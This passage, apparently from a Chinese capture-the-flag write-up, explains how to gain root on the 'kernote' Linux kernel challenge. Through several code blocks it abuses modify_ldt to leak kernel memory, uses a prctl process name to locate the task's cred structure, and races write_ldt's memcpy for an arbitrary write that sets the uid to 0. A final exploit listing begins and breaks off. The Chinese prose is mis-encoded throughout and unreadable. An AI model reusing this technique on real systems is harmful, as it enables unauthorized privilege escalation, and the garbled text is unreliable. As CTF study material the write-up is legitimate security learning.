class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(kernel_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    kernel_base += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ¬é¢˜å¼€å¯äº† <code>hardened usercopy</code> ä¿æŠ¤ï¼Œå½“ copy_to_user() çš„æºåœ°å€ä¸ºå†…æ ¸ .text æ®µï¼ˆ_stext, _etextï¼‰æ—¶<strong>ä¼šå¼•èµ· kernel panic</strong></p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘æ›´æ”¹æ€è·¯â€”â€”æœç´¢<code>ç‰©ç†åœ°å€ç›´æ¥æ˜ å°„åŒº</code>ï¼Œ<strong>æˆ‘ä»¬çš„ task_struct ç»“æ„ä½“ä¾¿åœ¨è¿™ä¸€å—åŒºåŸŸå†…</strong>ï¼Œåªè¦æˆ‘ä»¬æ‰¾åˆ°æœ¬è¿›ç¨‹çš„ task_structï¼Œæ›´æ”¹ cred çš„ uid ä¸º 0ï¼Œä¹Ÿèƒ½å¤Ÿå®Œæˆææƒ</p><blockquote><p>ç‰©ç†åœ°å€ç›´æ¥æ˜ å°„åŒºå³ direct mapping areaï¼Œå³<strong>çº¿æ€§æ˜ å°„åŒº</strong>ï¼ˆä¸æ˜¯çº¿ä»£é‚£ä¸ªçº¿æ€§æ˜ å°„ï¼‰ï¼Œè¿™å—åŒºåŸŸçš„çº¿æ€§åœ°å€åˆ°ç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„æ˜¯<strong>è¿ç»­çš„</strong>ï¼Œkmalloc ä¾¿ä»æ­¤å¤„åˆ†é…å†…å­˜</p><p>è€Œ vmalloc åˆ™ä» vmalloc&#x2F;ioremap space åˆ†é…å†…å­˜ï¼Œèµ·å§‹åœ°å€ä¸º <code>vmalloc_base</code>ï¼Œè¿™ä¸€å—åŒºåŸŸåˆ°ç‰©ç†åœ°å€é—´çš„æ˜ å°„æ˜¯<strong>ä¸è¿ç»­çš„</strong></p></blockquote><p>è¿™ä¸€å—åŒºåŸŸçš„èµ·å§‹åœ°å€ç§°ä¹‹ä¸º <code>page_offset_base</code>ï¼Œå…¶åœ°å€ä¸º <code>0xffff888000000000</code>ï¼ˆå‚è§ <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">è¿™â†‘é‡Œâ†“</a>ï¼‰ï¼Œæˆ‘ä»¬ä»è¿™ä¸ªåœ°å€å¼€å§‹æœç´¢å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-æ³„éœ²è¿›ç¨‹-task-struct-åœ°å€"><a href="#Step-II-æ³„éœ²è¿›ç¨‹-task-struct-åœ°å€" class="headerlink" title="Step II. æ³„éœ²è¿›ç¨‹ task_struct åœ°å€"></a>Step II. æ³„éœ²è¿›ç¨‹ task_struct åœ°å€</h4><p>é˜…è¯» <code>task_struct</code> æºç ï¼Œè§‚å¯Ÿåˆ°å…¶ä¸»ä½“å‡­è¯ä¸‹æ–¹æœ‰ä¸ªç‰¹æ®Šçš„å­—æ®µ <code>comm</code>ï¼š</p><blockquote><p>&#x2F;include&#x2F;linux&#x2F;sched.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå­—æ®µä¾¿æ˜¯è¯¥è¿›ç¨‹çš„åå­—ï¼Œä¸”å…¶ä½ç½®åˆšå¥½åœ¨ cred é™„è¿‘ï¼Œæˆ‘ä»¬åªéœ€è¦ä» <code>page_offset_base</code> å¼€å§‹æ‰¾å½“å‰è¿›ç¨‹çš„åå­—ä¾¿èƒ½å¤Ÿæ‰¾åˆ°å½“å‰è¿›ç¨‹çš„ task_struct</p><p>ä½¿ç”¨ prctl ç³»ç»Ÿè°ƒç”¨æˆ‘ä»¬å¯ä»¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ comm å­—æ®µï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿èƒ½å¤Ÿæ›´æ–¹ä¾¿åœ°è¿›è¡ŒæŸ¥æ‰¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwn!&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥æœç´¢æ•´ä¸ªçº¿æ€§æ˜ å°„åŒºåŸŸï¼Œè¿™ä»æœ‰å¯èƒ½è§¦å‘ hardened usercopy çš„æ£€æŸ¥ï¼Œåœ¨è¿™é‡Œå®˜æ–¹ç»™å‡ºäº†ä¸€ä¸ªç¾å¦™çš„è§£æ³•ï¼š</p><p>è§‚å¯Ÿ fork ç³»ç»Ÿè°ƒç”¨çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹æ‰§è¡Œé“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() å®šä¹‰äº <code>arch/x86/kernel/ldt.c</code> ä¸­ï¼Œæ³¨æ„åˆ°å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œä¼šé€šè¿‡ memcpy å°†çˆ¶è¿›ç¨‹çš„ ldt-&gt;entries æ‹·è´ç»™å­è¿›ç¨‹ï¼Œ<strong>æ˜¯å®Œå…¨å¤„åœ¨å†…æ ¸ä¸­çš„æ“ä½œ</strong>ï¼Œå› æ­¤ä¸ä¼šè§¦å‘ hardened usercopy çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨çˆ¶è¿›ç¨‹ä¸­è®¾å®šå¥½æœç´¢çš„åœ°å€ä¹‹åå†å¼€å­è¿›ç¨‹æ¥ç”¨ read_ldt() è¯»å–æ•°æ®å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">cur_pid = getpid();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">search_addr = page_offset_base;</span><br><span class="line">cred_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(search_addr);</span><br><span class="line">    <span class="type">int</span> ret = fork();</span><br><span class="line">    <span class="keyword">if</span> (!ret)    <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        signal(SIGSEGV, die);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">if</span> (result_addr \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">        &#123;</span><br><span class="line">            cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹å°±æ˜¯ uid çš„ç±»å‹ä¸º intï¼Œç¬”è€…å› ä¸ºè¿™ä¸ªç–å¿½å¡äº†å¥½ä¸€é˜µå­â€¦</p></blockquote><h4 id="Step-III-double-fetch-æ›´æ”¹è¿›ç¨‹-uid-å®Œæˆææƒ"><a href="#Step-III-double-fetch-æ›´æ”¹è¿›ç¨‹-uid-å®Œæˆææƒ" class="headerlink" title="Step III. double fetch æ›´æ”¹è¿›ç¨‹ uid å®Œæˆææƒ"></a>Step III. double fetch æ›´æ”¹è¿›ç¨‹ uid å®Œæˆææƒ</h4><p>åœ¨æˆ‘ä»¬è·å¾—äº† cred çš„åœ°å€ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å°† cred-&gt;euid æ›´æ”¹ä¸º 0 å°±èƒ½æ‹¥æœ‰ root æƒé™ï¼Œä¹‹åå†è°ƒç”¨ <code> setreuid ()</code> ç­‰ä¸€ç³»åˆ—å‡½æ•°å®Œæˆå…¨é¢çš„ææƒ</p><p>ç°åœ¨æˆ‘ä»¬è€ƒè™‘å¦‚ä½•åœ¨å†…æ ¸ç©ºé—´ä¸­è¿›è¡Œä»»æ„å†™ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬ä»ç„¶å€ŸåŠ© modify_ldt() ç³»ç»Ÿè°ƒç”¨æ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ï¼Œé‡æ–°å›åˆ° <code>write_ldt()</code> å‡½æ•°çš„ä¸»ä½“é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œåœ¨ memcpy æ—¶æ‰€æ‹·è´çš„å­—èŠ‚æ•°ä¸º <code>old_ldt-&gt;nr_entries * LDT_ENTRY_SIZE</code>ï¼Œå…¶ä¸­å‰è€…çš„ä¸Šé™å€¼ä¸åè€…éƒ½å®šä¹‰äº <code>arch/x86/include/uapi/asm/ldt.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™ä¸ªæ•°æ®é‡ç›¸å¯¹è¾ƒå¤§ï¼Œæ‹·è´éœ€è¦ç”¨åˆ°ä¸€å®šçš„æ—¶é—´ï¼Œè€Œåœ¨æ‹·è´ç»“æŸåæœ‰ä¸€å¥ <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code>ï¼Œå…¶ä¸­ ldt ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨ memcpy è¿‡ç¨‹ä¸­å°† new_ldt-&gt;entries æ›´æ”¹ä¸ºæˆ‘ä»¬çš„ç›®æ ‡åœ°å€ä»è€Œå®Œæˆä»»æ„åœ°å€å†™</strong>ï¼Œå³ double fetch</p><p>åœ¨è¿™é‡Œä¸ºäº†æé«˜åˆ©ç”¨çš„æˆåŠŸç‡ï¼Œç¬”è€…å‚ç…§å®˜æ–¹é¢˜è§£ä¸­ä½¿ç”¨ <code>sched_setaffinity</code> å°†ç›¸åº”çš„è¿›ç¨‹ç»‘å®šåˆ°å•ä¸ª CPU ä¸Šï¼ˆåœ¨ run.sh ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ ¸ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¼–è¯‘æ—¶éœ€åŒ…å« <code>#define _GNU_SOURCE</code></p><p>åœ¨è¿™é‡Œ<strong>æœ‰å‡ ä¸ªä»¤ç¬”è€…æ‰€ä¸è§£çš„ç‚¹</strong>ï¼Œç›®å‰æš‚æ—¶è¿˜æ²¡è”ç³»ä¸Šå‡ºé¢˜äººï¼ˆ<del>éƒ½è¿‡å»ä¸€ä¸ªæœˆäº†è°è¿˜çœ‹discordå•Š</del>ï¼‰ï¼š</p><ul><li>åœ¨å¼€å­è¿›ç¨‹ä»»æ„å†™ä¹‹å‰è¦å…ˆå°†å½“å‰çš„ <code>old_ldt-&gt;entries</code> è®¾ä¸º <code>cred_addr + 4</code>ï¼Œä¸ç„¶æˆåŠŸç‡ä¼šå¤§å¹…ä¸‹é™</li><li>ä»»æ„å†™æ—¶éœ€å…ˆåˆ†é… index ä¸º 1~ 15 çš„ objectï¼Œå¹¶å…¨éƒ¨é‡Šæ”¾ï¼Œé€‰å–å…¶ä¸­çš„ <code>index 11</code> æ¥è¿›è¡Œä»»æ„å†™ï¼Œå…¶ä»–çš„ index éƒ½ä¼šå¤±è´¥ï¼Œä»…åˆ†é…ä¸€ä¸ª object ä¹Ÿä¼šå¤±è´¥</li></ul><h4 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> kernote_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] %s \033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkSet</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6666</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 